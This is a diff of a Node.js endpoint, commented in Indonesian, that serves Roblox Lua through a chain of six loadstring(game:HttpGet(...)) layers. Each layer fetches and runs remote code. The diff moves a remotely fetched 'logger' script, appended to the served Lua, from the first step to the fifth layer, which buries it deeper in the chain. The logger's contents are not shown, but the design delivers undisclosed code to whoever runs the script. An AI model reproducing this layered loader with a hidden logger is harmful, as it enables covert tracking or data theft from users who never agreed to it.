@@ -97,7 +97,7 @@ module.exports = async function(req, res) {
     const currentPath = urlParts[0];
     
     try {
-        // ========== STEP 0: LOADSTRING KE LAYER 1 DULU, BARU LOGGER ==========
+        // ========== STEP 0: INIT SESSION ==========
         if (currentStep === 0) {
             let sequence = [];
             while (sequence.length < SETTINGS.TOTAL_LAYERS) {
@@ -108,11 +108,7 @@ module.exports = async function(req, res) {
             const { newSessionID, nextKey, waitTime } = makeSession(cleanIp, sequence, 0);
             const firstStep = sequence[0];
             const nextUrl = "https://" + host + currentPath + "?" + firstStep + "." + newSessionID + "." + nextKey;
-            const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
-
-            // loadstring PALING ATAS, logger di bawahnya
-            const luaScript = "task.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()\n" +
-                              (loggerScript || '');
+            const luaScript = "task.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
             return res.status(200).send(luaScript);
         }
 
@@ -154,13 +150,12 @@ module.exports = async function(req, res) {
         session.used = true;
 
         /*
-         * step 0  → loadstring layer 1 (atas) + logger (bawah)
-         * idx 0   → layer 1 → redirect
-         * idx 1   → layer 2 → redirect
-         * idx 2   → layer 3 → redirect
-         * idx 3   → layer 4 → redirect
-         * idx 4   → layer 5 → redirect
-         * idx 5   → layer 6 → MAIN SCRIPT ✅
+         * idx 0 → layer 1 → redirect
+         * idx 1 → layer 2 → redirect
+         * idx 2 → layer 3 → redirect
+         * idx 3 → layer 4 → redirect
+         * idx 4 → layer 5 → loadstring layer 6 (atas) + logger (bawah)
+         * idx 5 → layer 6 → MAIN SCRIPT ✅
          */
 
         // ========== LAYER 6 (idx 5): MAIN SCRIPT SAJA ==========
@@ -170,7 +165,24 @@ module.exports = async function(req, res) {
             return res.status(200).send(mainScript || '');
         }
 
-        // ========== LAYER 1-5 (idx 0-4): REDIRECT BIASA ==========
+        // ========== LAYER 5 (idx 4): LOADSTRING KE LAYER 6 ATAS + LOGGER BAWAH ==========
+        if (idx === 4) {
+            const nextStepNumber = session.stepSequence[5];
+            const { newSessionID, nextKey, waitTime } = makeSession(
+                session.ownerIP, session.stepSequence, 5
+            );
+            delete sessions[id];
+
+            const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
+            const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
+
+            // loadstring PALING ATAS, logger jalan di bawah bersamaan
+            const luaScript = "task.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()\n" +
+                              (loggerScript || '');
+            return res.status(200).send(luaScript);
+        }
+
+        // ========== LAYER 1-4 (idx 0-3): REDIRECT BIASA ==========
         const nextIndex = idx + 1;
         const nextStepNumber = session.stepSequence[nextIndex];
         const { newSessionID, nextKey, waitTime } = makeSession(
